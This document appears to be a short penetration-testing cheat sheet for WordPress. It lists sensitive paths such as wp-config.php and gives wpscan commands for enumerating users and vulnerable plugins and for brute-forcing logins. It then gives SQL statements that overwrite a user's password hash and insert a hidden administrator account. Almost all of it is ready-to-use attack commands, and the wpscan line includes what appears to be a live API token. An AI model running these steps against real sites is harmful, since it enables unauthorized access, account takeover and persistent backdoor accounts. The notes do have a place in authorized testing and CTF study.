# wordpress

## Interesting Paths

```bash
# login page
/wp-login.php
/wp-admin/

# themes location
/wp-content/themes/<>/404.php

# plugin location
/wp-content/plugins/<>/

# config file
/wp-config.php
```

## wpscan

```bash
# do not pass url to login page.
$ wpscan --url IP [-e FLAG] [--plugins-detection [aggressive | mixed] -t 80] [--usernames <>] [--api-token LCxrlACzmauabSxeXKdc0ORevBnsIFkcQ5hVonza2dY]

# -e: enumerate <>
# [p| vp | ap]: [plgins | vulnerable plugins | all plugins]
# u: users
# t: themes
# --disable-tls-checks: for https

# blank for all enum
wpscan --url <IP> -e vp, u

# brute force login
wpscan --url <IP> --usernames <users> --passwords <pass> --max-threads 50
```

## Update Password

```bash
https://www.useotools.com/wordpress-password-hash-generator
# pass: kashz
UPDATE `wp_users` SET `user_pass` = '$P$BuFjqko0rfp9.fRk9Ld2CRc6hsG0nd0' WHERE ID = <>;
```

## make user admin | db: mysql

```bash
# using https://www.wpbeginner.com/wp-tutorials/how-to-add-an-admin-user-to-the-wordpress-database-via-mysql/

# may need to change UID: 4
INSERT INTO wp_users VALUES ('4', 'kashz', MD5('kashz'), 'kashz', 'kashz@DOMAIN.COM', 'http://DOMAIN.COM/', '2020-12-16 14:51:26', '', '0', 'kashz');
INSERT INTO wp_usermeta VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
INSERT INTO wp_usermeta VALUES (NULL, '4', 'wp_user_level', '10');
```
